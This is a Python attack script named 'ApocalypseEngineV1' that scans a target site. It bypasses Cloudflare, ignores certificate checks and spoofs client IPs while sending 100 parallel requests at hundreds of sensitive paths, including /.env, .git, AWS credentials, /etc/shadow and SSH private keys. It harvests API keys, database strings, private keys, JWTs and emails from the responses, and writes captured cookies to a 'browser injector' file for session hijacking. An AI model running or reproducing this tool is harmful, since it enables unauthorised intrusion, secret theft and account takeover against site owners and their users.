import requests
import json
import re
import cloudscraper
import warnings
import urllib3
import ssl
import sys
import time
import random
import math
import socket
import base64
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, urlparse
from colorama import Fore, Style, init
from bs4 import BeautifulSoup


warnings.filterwarnings("ignore")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

class ApocalypseEngineV1:
    def __init__(self, target_input):

        clean_target = re.sub(r'[^\x20-\x7E]', '', target_input).strip()
        if not clean_target.startswith("http"):
            clean_target = "https://" + clean_target
        
        self.base_url = clean_target
        self.domain = urlparse(clean_target).netloc
        self.developer = "xxxxxthefox"
        

        self.ssl_ctx = ssl.create_default_context()
        self.ssl_ctx.set_ciphers('ALL:!ADH:!EXPORT:!DES:!RC4:!MD5:!PSK:!aECDH:!EDH-DSS-DES-CBC3-SHA:!EDH-RSA-DES-CBC3-SHA:ECDHE-RSA-AES256-GCM-SHA384:AES256-GCM-SHA384:CHACHA20-POLY1305-SHA256')
        self.ssl_ctx.check_hostname = False
        self.ssl_ctx.verify_mode = ssl.CERT_NONE


        self.session = cloudscraper.create_scraper(
            browser={'browser': 'chrome', 'platform': 'android', 'desktop': False},
            ssl_context=self.ssl_ctx
        )

        self.intel = {
            "Infrastructure": {},
            "Subdomains": set(),
            "Session_Vault": {"HttpOnly": [], "Secure": [], "Standard": []},
            "JWT_Payloads": [],
            "Extracted_Secrets": [],
            "Vulnerability_Map": [],
            "Asset_Discovery": set(),
            "Source_Leaks": [],
            "Injection_Ready_Cookies": []
        }


        self.master_matrix = list(set([
            '/.env', '/.git/config', '/.aws/credentials', '/.docker/config.json',
            '/wp-config.php.bak', '/config.php~', '/.htaccess', '/.htpasswd',
            '/phpinfo.php', '/_status', '/server-status', '/web-console/',
            '/api/.env', '/core/.env', '/backup.zip', '/database.sql.gz',
            '/composer.json', '/package.json', '/config/db.php', '/scripts/db.sql',
            '/.vscode/settings.json', '/admin/login.php', '/auth/config', '/swagger.json',
            '/api/v1/debug', '/config/settings.yaml', '/.ssh/id_rsa', '/.npmrc',
            '/WEB-INF/web.xml', '/backup/', '/conf/server.xml', '/.git/HEAD',
            '/config/database.yml', '/app/config/parameters.yml', '/var/log/apache2/access.log',
            '/.bash_history', '/.mysql_history', '/.php_cs', '/.travis.yml', '/Dockerfile',
            '/docker-compose.yml', '/Procfile', '/Gemfile', '/Pipfile', '/api/docs',
            '/v1/api-docs', '/v2/api-docs', '/v3/api-docs', '/swagger-ui.html',
            '/api/swagger-ui.html', '/drupal/readme.txt', '/readme.html', '/license.txt',
            '/core/install.php', '/modules/user/user.module', '/sites/default/settings.php',
            '/administrator/manifests/files/joomla.xml', '/wp-admin/admin-ajax.php',
            '/wp-content/debug.log', '/wp-includes/wlwmanifest.xml', '/xmlrpc.php',
            '/magento/app/etc/local.xml', '/js/mage/cookies.js', '/shell/',
            '/.well-known/security.txt', '/.well-known/assetlinks.json', '/ads.txt',
            '/robots.txt', '/sitemap.xml', '/crossdomain.xml', '/clientaccesspolicy.xml',
            '/.env.local', '/.env.dev', '/.env.prod', '/.env.test', '/.gitattributes',
            '/.gitignore', '/.gitmodules', '/.hg/', '/.svn/entries', '/.bzr/',
            '/CVS/Entries', '/.DS_Store', '/Thumbs.db', '/error_log', '/access_log',
            '/logs/access.log', '/logs/error.log', '/database.sqlite', '/db.sqlite',
            '/data.sqlite', '/storage/logs/laravel.log', '/storage/framework/views/',
            '/bootstrap/cache/', '/node_modules/', '/bower_components/', '/vendor/',
            '/debug/', '/test/', '/tests/', '/demo/', '/samples/', '/examples/',
            '/tmp/', '/temp/', '/upload/', '/uploads/', '/media/', '/static/',
            '/assets/', '/bin/', '/etc/', '/lib/', '/src/', '/usr/', '/var/',
            '/proc/self/environ', '/etc/passwd', '/etc/shadow', '/etc/group',
            '/etc/hosts', '/etc/network/interfaces', '/etc/issue', '/etc/motd',
            '/admin/config.php', '/api/v1/user', '/api/v1/admin', '/api/v2/auth',
            '/v1/auth/login', '/v1/auth/register', '/v2/api/v1/debug', '/ws/',
            '/socket.io/', '/graphql', '/graphiql', '/.well-known/openid-configuration',
            '/api/v1/settings', '/api/v1/config', '/api/v1/database', '/admin/db',
            '/phpmyadmin/index.php', '/pma/index.php', '/myadmin/index.php',
            '/mysql/index.php', '/sql/index.php', '/database/index.php',
            '/admin/pma/index.php', '/admin/mysql/index.php', '/admin/sql/index.php',
            '/cp/index.php', '/controlpanel/index.php', '/panel/index.php',
            '/manager/html', '/manager/status', '/web-dav/', '/dav/',
            '/svn/', '/git/', '/repo/', '/sources/', '/src/main/resources/',
            '/src/main/webapp/', '/app/config/', '/app/storage/', '/app/database/',
            '/storage/app/', '/storage/logs/', '/storage/framework/',
            '/storage/database/', '/database/seeds/', '/database/migrations/',
            '/resources/views/', '/resources/assets/', '/public/assets/',
            '/public/css/', '/public/js/', '/public/img/', '/public/uploads/',
            '/assets/css/', '/assets/js/', '/assets/img/', '/assets/fonts/',
            '/assets/vendors/', '/static/css/', '/static/js/', '/static/img/',
            '/static/media/', '/static/fonts/', '/theme/css/', '/theme/js/',
            '/theme/img/', '/theme/assets/', '/skins/css/', '/skins/js/',
            '/includes/js/', '/includes/css/', '/includes/functions.php',
            '/includes/config.php', '/inc/config.php', '/inc/db.php',
            '/inc/functions.php', '/lib/config.php', '/lib/db.php',
            '/lib/functions.php', '/core/config.php', '/core/db.php',
            '/core/functions.php', '/app/config.php', '/app/db.php',
            '/app/functions.php', '/config/app.php', '/config/db.php',
            '/config/services.php', '/config/auth.php', '/config/cache.php',
            '/config/view.php', '/config/session.php', '/config/queue.php',
            '/config/mail.php', '/config/logging.php', '/config/broadcasting.php',
            '/config/filesystems.php', '/config/database.php', '/config/app.json',
            '/config/db.json', '/config/auth.json', '/config/cache.json',
            '/config/view.json', '/config/session.json', '/config/queue.json',
            '/config/mail.json', '/config/logging.json', '/config/broadcasting.json',
            '/config/filesystems.json', '/config/database.json', '/settings.json',
            '/settings.php', '/settings.yaml', '/settings.yml', '/params.json',
            '/params.php', '/params.yaml', '/params.yml', '/local.json',
            '/local.php', '/local.yaml', '/local.yml', '/dev.json',
            '/dev.php', '/dev.yaml', '/dev.yml', '/prod.json',
            '/prod.php', '/prod.yaml', '/prod.yml', '/test.json',
            '/test.php', '/test.yaml', '/test.yml', '/staging.json',
            '/staging.php', '/staging.yaml', '/staging.yml', '/docker.json',
            '/docker.php', '/docker.yaml', '/docker.yml', '/env.json',
            '/env.php', '/env.yaml', '/env.yml', '/secrets.json',
            '/secrets.php', '/secrets.yaml', '/secrets.yml', '/keys.json',
            '/keys.php', '/keys.yaml', '/keys.yml', '/auth.json',
            '/auth.php', '/auth.yaml', '/auth.yml', '/credentials.json',
            '/credentials.php', '/credentials.yaml', '/credentials.yml',
            '/account.json', '/account.php', '/account.yaml', '/account.yml',
            '/user.json', '/user.php', '/user.yaml', '/user.yml',
            '/admin.json', '/admin.php', '/admin.yaml', '/admin.yml',
            '/database.json', '/database.php', '/database.yaml', '/database.yml',
            '/db.json', '/db.php', '/db.yaml', '/db.yml', '/sql.json',
            '/sql.php', '/sql.yaml', '/sql.yml', '/dump.json',
            '/dump.php', '/dump.yaml', '/dump.yml', '/backup.json',
            '/backup.php', '/backup.yaml', '/backup.yml', '/old.json',
            '/old.php', '/old.yaml', '/old.yml', '/temp.json',
            '/temp.php', '/temp.yaml', '/temp.yml', '/tmp.json',
            '/tmp.php', '/tmp.yaml', '/tmp.yml', '/new.json',
            '/new.php', '/new.yaml', '/new.yml', '/v1.json',
            '/v1.php', '/v1.yaml', '/v1.yml', '/v2.json',
            '/v2.php', '/v2.yaml', '/v2.yml', '/api.json',
            '/api.php', '/api.yaml', '/api.yml', '/rest.json',
            '/rest.php', '/rest.yaml', '/rest.yml', '/web.json',
            '/web.php', '/web.yaml', '/web.yml', '/app.json',
            '/app.php', '/app.yaml', '/app.yml', '/core.json',
            '/core.php', '/core.yaml', '/core.yml', '/main.json',
            '/main.php', '/main.yaml', '/main.yml', '/index.json',
            '/index.php', '/index.yaml', '/index.yml', '/common.json',
            '/common.php', '/common.yaml', '/common.yml', '/all.json',
            '/all.php', '/all.yaml', '/all.yml', '/site.json',
            '/site.php', '/site.yaml', '/site.yml', '/web.config',
            '/php.ini', '/.user.ini', '/.profile', '/.bashrc',
            '/.zshrc', '/.vimrc', '/.ssh/authorized_keys', '/.ssh/known_hosts',
            '/admin/uploads/', '/backup/db.sql', '/data/config.php', '/lib/db.php',
            '/src/config.json', '/scripts/setup.sh', '/auth/keys.json', '/api/v1/users',
            '/dashboard/stats', '/monitor/status', '/logs/main.log', '/tmp/session_data',
            '/etc/shadow', '/etc/passwd', '/etc/apache2/sites-enabled/000-default.conf',
            '/root/.bash_history', '/root/.ssh/id_rsa', '/var/www/html/.env',
            '/api/v1/auth/session', '/admin/ajax/user_data', '/config/local_settings.py'
        ]))

    def banner(self):
        print(Fore.RED + Style.BRIGHT + "╔" + "═"*78 + "╗")
        print(Fore.RED + Style.BRIGHT + "║" + " "*27 + "V1: THE APOCALYPSE ENGINE" + " "*25 + "║")
        print(Fore.YELLOW + Style.BRIGHT + "║" + " "*33 + f"DEV: {self.developer}" + " "*29 + "║")
        print(Fore.RED + Style.BRIGHT + "╚" + "═"*78 + "╝")

    def log(self, color, msg):
        print(color + f"[*] {msg}")

    def shannon_entropy(self, data):
        if not data: return 0
        entropy = 0
        for x in range(256):
            p_x = float(data.count(chr(x))) / len(data)
            if p_x > 0: entropy += - p_x * math.log(p_x, 2)
        return entropy

    def fetch_infrastructure(self):
        
        try:
            ip = socket.gethostbyname(self.domain)
            res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
            self.intel["Infrastructure"] = {"IP": ip, "ISP": res.get('isp'), "Loc": f"{res.get('city')}, {res.get('country')}"}
            self.log(Fore.CYAN, f"Host Decoded: {ip} ({res.get('isp')})")
            

            sub_res = requests.get(f"https://crt.sh/?q=%25.{self.domain}&output=json", timeout=15, verify=False)
            if sub_res.status_code == 200:
                for entry in sub_res.json():
                    names = entry['name_value'].lower().split('\n')
                    for n in names:
                        if n.endswith(self.domain): self.intel["Subdomains"].add(n)
            self.log(Fore.GREEN, f"Infrastructure: {len(self.intel['Subdomains'])} Subdomains Found.")
        except: pass

    def dissect_sessions(self, jar, headers, url):
        
        for k, v in jar.items():
            h_str = str(headers).lower()
            is_httponly = "httponly" in h_str
            is_secure = "secure" in h_str
            
            cookie_entry = {"name": k, "value": v, "src": url, "httponly": is_httponly, "secure": is_secure}
            
            if is_httponly: self.intel["Session_Vault"]["HttpOnly"].append(cookie_entry)
            elif is_secure: self.intel["Session_Vault"]["Secure"].append(cookie_entry)
            else: self.intel["Session_Vault"]["Standard"].append(cookie_entry)
            

            self.intel["Injection_Ready_Cookies"].append({
                "domain": self.domain, "name": k, "value": v, "path": "/",
                "httpOnly": is_httponly, "secure": is_secure, "sameSite": "no_restriction"
            })

    def deep_logic_analyzer(self, text, url):
        

        jwts = re.findall(r'[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_/=\+]+', text)
        for j in jwts:
            if len(j) > 45 and self.shannon_entropy(j) > 4.2:
                try:
                    payload = j.split('.')[1]
                    decoded = json.loads(base64.b64decode(payload + "==").decode('utf-8'))
                    self.intel["JWT_Payloads"].append({"src": url, "data": decoded})
                    self.log(Fore.YELLOW, f"JWT DECODED: Source -> {url}")
                except: pass


        patterns = {
            "API_KEY": r'(?i)(api_key|access_token|secret_key|app_id|token)["\s:=]+["\']([a-zA-Z0-9_\-]{16,})["\']',
            "DB_CONN": r'[a-z]+://[a-z0-9_]+:[a-z0-9_]+@[a-z0-9\.-]+:[0-9]+/[a-z0-9_]+',
            "EMAIL": r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            "PRIVATE_KEY": r'-----BEGIN [A-Z ]+ PRIVATE KEY-----'
        }
        for label, pat in patterns.items():
            matches = re.findall(pat, text)
            for m in matches:
                val = m[1] if isinstance(m, tuple) else m
                if self.shannon_entropy(str(val)) > 3.5:
                    self.intel["Extracted_Secrets"].append({"type": label, "val": val, "src": url})


        comments = re.findall(r'', text, re.DOTALL)
        for c in comments:
            if any(x in c.lower() for x in ['todo', 'fixme', 'admin', 'password', 'config', 'root', 'dev']):
                self.intel["Source_Leaks"].append({"src": url, "comment": c.strip()})

    def assault_vector(self, target_path):
        
        url = urljoin(self.base_url, target_path) if not target_path.startswith("http") else target_path
        try:

            time.sleep(random.uniform(0.01, 0.04))
            h = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36",
                "Referer": self.base_url,
                "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            }
            res = self.session.get(url, headers=h, timeout=12, verify=False, allow_redirects=True)
            

            self.dissect_sessions(res.cookies.get_dict(), res.headers, url)
            
            if res.status_code == 200:
                self.deep_logic_analyzer(res.text, url)
                critical = ['root:', 'aws_key', 'db_password', 'connectionstring', 'id_rsa', 'secret_key']
                if any(ind in res.text.lower() for ind in critical):
                    self.log(Fore.RED + Style.BRIGHT, f"!!! CRITICAL LEAK: {url}")
                    self.intel["Vulnerability_Map"].append(url)
                else:
                    self.log(Fore.GREEN, f"Found: {url}")
                    self.intel["Asset_Discovery"].add(url)
            elif res.status_code in [403, 401]:
                self.log(Fore.YELLOW, f"Forbidden Path (Live): {url}")
        except: pass

    def run_apocalypse(self):
        self.banner()
        self.fetch_infrastructure()
        
        try:
            self.log(Fore.WHITE, "Initializing Phase 1: Structural Dissection...")
            main_res = self.session.get(self.base_url, timeout=15, verify=False)
            self.dissect_sessions(self.session.cookies.get_dict(), main_res.headers, self.base_url)
            self.deep_logic_analyzer(main_res.text, self.base_url)


            soup = BeautifulSoup(main_res.text, 'html.parser')
            internal_links = [urljoin(self.base_url, a.get('href')) for a in soup.find_all(['a', 'link']) if a.get('href')]
            internal_scripts = [urljoin(self.base_url, s.get('src')) for s in soup.find_all('script') if s.get('src')]
            

            full_queue = list(set(
                internal_links + 
                internal_scripts + 
                [urljoin(self.base_url, p) for p in self.master_matrix] + 
                [f"https://{sub}" for sub in list(self.intel["Subdomains"])[:30]]
            ))

            self.log(Fore.MAGENTA, f"Phase 2: Executing Mass Assault ({len(full_queue)} Vectors)...")
            with ThreadPoolExecutor(max_workers=100) as executor:
                executor.map(self.assault_vector, full_queue)

            self.archive_all()
        except Exception as e:
            self.log(Fore.RED, f"Fatal Crash: {e}")

    def archive_all(self):
        timestamp = int(time.time())
        report_fn = f"APOCALYPSE_REPORT_{self.domain.replace('.', '_')}_{timestamp}.json"
        inject_fn = f"BROWSER_INJECTOR_{self.domain.replace('.', '_')}_{timestamp}.json"
        

        full_data = {
            "Rights": self.developer,
            "Target": self.domain,
            "Infrastructure": self.intel["Infrastructure"],
            "Subdomains": list(self.intel["Subdomains"]),
            "Sessions": self.intel["Session_Vault"],
            "JWT_Decoded": self.intel["JWT_Payloads"],
            "Secrets": self.intel["Extracted_Secrets"],
            "Source_Leaks": self.intel["Source_Leaks"],
            "Critical_Points": self.intel["Vulnerability_Map"],
            "Asset_Map": list(self.intel["Asset_Discovery"])
        }
        
        with open(report_fn, "w", encoding="utf-8") as f:
            json.dump(full_data, f, indent=4, ensure_ascii=False)
        
        with open(inject_fn, "w", encoding="utf-8") as f:
            json.dump(self.intel["Injection_Ready_Cookies"], f, indent=4)
            
        print("\n" + Fore.RED + Style.BRIGHT + "═"*80)
        self.log(Fore.GREEN, "DISSECTION COMPLETE. TARGET PULVERIZED.")
        self.log(Fore.CYAN, f"MASTER REPORT: {report_fn}")
        self.log(Fore.YELLOW, f"READY INJECTOR: {inject_fn}")
        print(Fore.RED + Style.BRIGHT + "═"*80)

if __name__ == "__main__":

    target = sys.argv[1] if len(sys.argv) > 1 else input(Fore.YELLOW + "🔗 TARGET URL: ").strip()
    if target:
        ApocalypseEngineV1(target).run_apocalypse()